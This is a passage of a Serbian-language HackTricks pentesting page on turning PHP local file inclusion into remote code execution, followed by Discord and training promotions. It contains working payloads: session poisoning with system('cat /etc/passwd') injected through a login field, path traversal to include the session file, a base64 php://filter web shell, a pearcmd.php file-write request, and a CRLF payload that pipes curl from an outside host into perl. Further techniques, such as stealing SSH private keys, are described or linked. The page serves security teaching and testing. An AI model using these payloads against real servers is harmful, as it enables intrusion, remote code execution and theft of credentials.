Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
U PHP-u, ove sesije se ƒçuvaju u _/var/lib/php5/sess\\_\[PHPSESSID]\_ datotekama.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Postavite kolaƒçiƒá na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Iskoristite LFI da ukljuƒçite PHP sesijski fajl
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Ako je ssh aktivan, proverite koji korisnik se koristi (/proc/self/status & /etc/passwd) i poku≈°ajte da pristupite **\<HOME>/.ssh/id\_rsa**

### **Via** **vsftpd** _**logs**_

Logovi za FTP server vsftpd se nalaze na _**/var/log/vsftpd.log**_. U scenariju gde postoji ranjivost Local File Inclusion (LFI), i pristup izlo≈æenom vsftpd serveru je moguƒá, sledeƒái koraci se mogu razmotriti:

1. Injektujte PHP payload u polje korisniƒçkog imena tokom procesa prijavljivanja.
2. Nakon injekcije, iskoristite LFI da preuzmete server logove sa _**/var/log/vsftpd.log**_.

### Via php base64 filter (using base64)

Kao ≈°to je prikazano u [ovom](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) ƒçlanku, PHP base64 filter jednostavno ignori≈°e Non-base64. Mo≈æete to iskoristiti da zaobiƒëete proveru ekstenzije fajla: ako dostavite base64 koji se zavr≈°ava sa ".php", on ƒáe jednostavno ignorisati "." i dodati "php" na base64. Evo primera payload-a:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Putem php filtera (nije potreban fajl)

Ovaj [**izve≈°taj**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) obja≈°njava da mo≈æete koristiti **php filtere za generisanje proizvoljnog sadr≈æaja** kao izlaz. ≈†to u su≈°tini znaƒçi da mo≈æete **generisati proizvoljan php kod** za ukljuƒçivanje **bez potrebe da ga napi≈°ete** u fajl.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Putem gre≈°ke segmentacije

**Otpremite** fajl koji ƒáe biti saƒçuvan kao **privremeni** u `/tmp`, zatim u **isto zahtev**, izazovite **gre≈°ku segmentacije**, i tada **privremeni fajl neƒáe biti obrisan** i mo≈æete ga potra≈æiti.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Putem Nginx privremene pohrane fajlova

Ako ste prona≈°li **Local File Inclusion** i **Nginx** radi ispred PHP-a, mo≈æda ƒáete moƒái da dobijete RCE koristeƒái sledeƒáu tehniku:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Putem PHP\_SESSION\_UPLOAD\_PROGRESS

Ako ste prona≈°li **Local File Inclusion** ƒçak i ako **nemate sesiju** i `session.auto_start` je `Off`. Ako pru≈æite **`PHP_SESSION_UPLOAD_PROGRESS`** u **multipart POST** podacima, PHP ƒáe **omoguƒáiti sesiju za vas**. Mo≈æete to zloupotrebiti da dobijete RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Putem privremenih otpremanja fajlova u Windows-u

Ako ste prona≈°li **Local File Inclusion** i server radi na **Windows-u**, mo≈æda ƒáete dobiti RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Putem `pearcmd.php` + URL argumenata

Kao ≈°to je [**obja≈°njeno u ovom postu**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), skripta `/usr/local/lib/phppearcmd.php` postoji po defaultu u php docker slikama. ≈†tavi≈°e, moguƒáe je proslediti argumente skripti putem URL-a jer je naznaƒçeno da ako URL parametar nema `=`, treba ga koristiti kao argument.

Sledeƒái zahtev kreira fajl u `/tmp/hello.php` sa sadr≈æajem `<?=phpinfo()?>`:

{% code overflow="wrap" %}
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
{% endcode %}

Sledeƒáe zloupotrebljava CRLF ranjivost da bi dobilo RCE (iz [**ovde**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Putem phpinfo() (file\_uploads = on)

Ako ste prona≈°li **Local File Inclusion** i datoteku koja izla≈æe **phpinfo()** sa file\_uploads = on, mo≈æete dobiti RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Putem compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Otkrivanje putanje

Ako ste prona≈°li **Local File Inclusion** i **mo≈æete eksfiltrirati putanju** privremene datoteke, ALI **server** **proverava** da li **datoteka koja se ukljuƒçuje ima PHP oznake**, mo≈æete poku≈°ati da **zaobiƒëete tu proveru** sa ovom **Race Condition**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Putem veƒçnog ƒçekanja + bruteforce

Ako mo≈æete zloupotrebiti LFI da **otpremite privremene datoteke** i naterate server da **zaka≈æe** PHP izvr≈°enje, mogli biste tada **bruteforce-ovati imena datoteka tokom sati** da pronaƒëete privremenu datoteku:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Do Fatal Error

Ako ukljuƒçite bilo koju od datoteka `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Morate ukljuƒçiti istu dva puta da izazovete tu gre≈°ku).

**Ne znam koliko je ovo korisno, ali mo≈æda jeste.**\
_ƒåak i ako izazovete PHP Fatal Error, PHP privremene datoteke koje su otpremljene se bri≈°u._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## Reference

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Pridru≈æite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru da komunicirate sa iskusnim hakerima i lovcima na gre≈°ke!

**Hacking Insights**\
Ukljuƒçite se u sadr≈æaj koji se bavi uzbuƒëenjem i izazovima hakovanja

**Real-Time Hack News**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovija Obave≈°tenja**\
Budite informisani o najnovijim nagradama za gre≈°ke i va≈ænim a≈æuriranjima platformi

**Pridru≈æite nam se na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i poƒçnite da saraƒëujete sa vrhunskim hakerima danas!

{% hint style="success" %}
Uƒçite i ve≈æbajte AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Uƒçite i ve≈æbajte GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr≈æite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
